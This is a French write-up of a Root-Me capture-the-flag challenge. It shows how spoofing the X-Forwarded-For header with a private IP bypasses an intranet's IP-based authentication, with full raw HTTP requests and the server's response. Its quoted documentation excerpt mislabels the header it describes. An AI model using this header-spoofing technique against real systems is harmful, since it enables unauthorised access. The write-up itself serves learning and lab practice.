# HTTP - Contournement de filtrage IP

## Enoncé

```
Chers collègues,

Nous avons réussi à gérer les connexions à l’intranet via les adresses IP privées, il ne sera donc plus nécessaire de vous identifier par compte / mot de passe quand vous serez déjà connecté au réseau interne de l’entreprise.

Cordialement,

L’administrateur réseau
```

## Procédure

1. Analyse 

J'arrive sur une page de login + password pour un intranet et les messages suivants : 

```
Your IP 2a01:XXXXXXXXXXXXX:5611 do not belong to the LAN.
You should authenticate because you're not on the LAN.
```

2. Envoie d'une requête et analyse du header

```
POST /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch68/
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

login=jesuislogin&mdp=jesuispassword
```

3. Contournement du filtrage IP 

Afin de se faire passer pour un utilisateur local il suffit de rajouter dans le header de la requête une information indiquant qu'on utilise une IP locale comme ```192.168.1.1, 192.168.1.2, 10.0.0.1, 10.0.0.2```

Après une recherche dans la documentation https://developer.mozilla.org/, j'apperçoit : 

```
X-Forwarded-Host
Identifie le protocole (HTTP ou HTTPS) utilisé par le client pour se connecter à l'intermédiaire (proxy ou un load balancer).

Examples:
X-Forwarded-For: 2001:db8:85a3:8d3:1319:8a2e:370:7348

X-Forwarded-For: 203.0.113.195

X-Forwarded-For: 203.0.113.195, 2001:db8:85a3:8d3:1319:8a2e:370:7348

X-Forwarded-For: 203.0.113.195,2001:db8:85a3:8d3:1319:8a2e:370:7348,198.51.100.178
```

Nouveau header : 

```
POST /web-serveur/ch68/ HTTP/1.1
Host: challenge01.root-me.org
Content-Length: 11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge01.root-me.org/web-serveur/ch68/
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
X-Forwarded-For: 192.168.1.1

login=&mdp=
```

Réponse : 

```
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 06 Jan 2024 12:02:41 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Content-Length: 391

<!DOCTYPE html>
<html>
<head>
	<title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
			<h1>Intranet</h1>
		<div>
			Well done, the validation password is: <strong>IXXXXXXXXng
</strong>
		</div>
	</body>
</html>
```